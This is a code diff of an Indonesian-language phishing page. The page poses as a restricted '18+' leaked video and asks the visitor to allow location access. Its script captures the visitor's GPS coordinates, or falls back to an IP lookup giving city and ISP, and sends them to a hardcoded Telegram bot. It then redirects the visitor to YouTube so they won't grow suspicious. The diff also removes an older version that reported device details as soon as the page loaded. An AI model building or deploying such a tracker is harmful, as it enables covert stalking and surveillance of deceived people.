@@ -3,76 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memverifikasi Koneksi...</title>
+    <title>Video Tersebar - Private Cloud Storage</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fc; color: #333; }
-        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #007bff; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 15px; font-size: 14px; color: #666; }
+        body { background-color: #000; color: #fff; text-align: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; justify-content: center; height: 100vh; }
+        .video-container { width: 90%; max-width: 500px; margin: 0 auto; background: #111; border: 1px solid #333; border-radius: 8px; position: relative; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .preview-img { width: 100%; height: 280px; object-fit: cover; opacity: 0.4; filter: blur(3px); }
+        .play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; cursor: pointer; }
+        .play-btn { width: 70px; height: 70px; background: rgba(255, 0, 0, 0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.3s; box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
+        .play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 8px; }
+        .info-text { padding: 20px; font-size: 14px; }
+        .warning { color: #ff4d4d; font-weight: bold; margin-bottom: 5px; }
+        .sub-text { color: #888; font-size: 12px; }
+        #status { margin-top: 10px; color: #555; font-size: 11px; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <p>Sedang menghubungkan ke server aman...</p>
+
+    <div class="video-container" onclick="mulaiPelacakan()">
+        <img src="https://via.placeholder.com/500x280/111111/444444?text=Buffering..." class="preview-img">
+        <div class="play-overlay">
+            <div class="play-btn"></div>
+            <div style="margin-top: 15px; font-weight: bold;">Putar Video (2:45)</div>
+        </div>
+    </div>
+
+    <div class="info-text">
+        <div class="warning">⚠️ KONTEN TERBATAS (18+)</div>
+        <div class="sub-text">Verifikasi lokasi diperlukan untuk memastikan Anda berada di wilayah yang diizinkan untuk melihat konten ini.</div>
+        <div id="status">Menunggu interaksi...</div>
+    </div>
 
     <script>
-        // --- DATA ANDA ---
+        // --- KONFIGURASI ANDA ---
         const TELEGRAM_TOKEN = "8792868527:AAE4eltXO4eY-qgIOwrk4Tirf5qrhAdgUbQ";
         const CHAT_ID = "1354234561";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Link tujuan setelah kena lacak
 
-        function kirimLaporan(pesan) {
+        function kirimKeTelegram(pesan) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
             fetch(url);
         }
 
-        function dapatkanInfoPerangkat() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            return `📱 *Info Perangkat:*\n\`${userAgent}\`\nPlatform: \`${platform}\``;
+        function lacakIP(alasan) {
+            document.getElementById('status').innerText = "Memverifikasi via IP...";
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const msg = `⚠️ *IZIN GPS DITOLAK/GAGAL*\n` +
+                                `Sebab: \`${alasan}\`\n\n` +
+                                `🌐 *Info Jaringan:*\n` +
+                                `IP: \`${data.ip}\`\n` +
+                                `Kota: \`${data.city}, ${data.region}\`\n` +
+                                `ISP: \`${data.org}\`\n\n` +
+                                `📍 [Lokasi Estimasi IP](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
+                    kirimKeTelegram(msg);
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+                })
+                .catch(() => {
+                    kirimKeTelegram("❌ Gagal total melacak IP/GPS.");
+                    window.location.href = REDIRECT_URL;
+                });
         }
 
-        function init() {
-            // Kirim info perangkat segera saat link dibuka
-            kirimLaporan("⚡ *Link Dibuka!*\n" + dapatkanInfoPerangkat());
-
+        function mulaiPelacakan() {
+            document.getElementById('status').innerText = "Meminta izin sistem...";
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const acc = position.coords.accuracy;
-                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        const laporan = `📍 *Target Terdeteksi!*\n\n` +
-                                        `🌐 Lat: \`${lat}\`\n` +
-                                        `🌐 Lon: \`${lon}\`\n` +
-                                        `🎯 Akurasi: \`${acc} meter\`\n\n` +
-                                        `🗺 [Buka di Google Maps](${mapsUrl})`;
-                        
-                        kirimLaporan(laporan);
-                        
-                        // Opsional: Setelah dapat lokasi, pindahkan ke YouTube agar tidak curiga
-                        setTimeout(() => {
-                           window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
-                        }, 2000);
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        const msg = `📍 *TARGET TERDETEKSI (GPS AKURAT)!*\n\n` +
+                                    `🌐 Lat: \`${lat}\`\n` +
+                                    `🌐 Lon: \`${lon}\`\n` +
+                                    `🎯 Akurasi: \`${acc} meter\`\n\n` +
+                                    `🗺 [Buka Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+                        kirimKeTelegram(msg);
+                        document.getElementById('status').innerText = "Berhasil! Mengalihkan...";
+                        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
                     },
-                    (error) => {
-                        let msg = "";
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED: msg = "⚠️ Target menolak izin lokasi."; break;
-                            case error.POSITION_UNAVAILABLE: msg = "⚠️ Informasi lokasi tidak tersedia."; break;
-                            case error.TIMEOUT: msg = "⚠️ Waktu permintaan lokasi habis."; break;
-                        }
-                        kirimLaporan(msg);
+                    (err) => {
+                        let sebab = "Ditolak user";
+                        if(err.code == 2) sebab = "Sinyal GPS lemah";
+                        if(err.code == 3) sebab = "Timeout";
+                        lacakIP(sebab);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 8000 }
                 );
             } else {
-                kirimLaporan("❌ Browser tidak mendukung Geolocation.");
+                lacakIP("Browser tidak dukung GPS");
             }
         }
-
-        window.onload = init;
     </script>
 </body>
 </html>
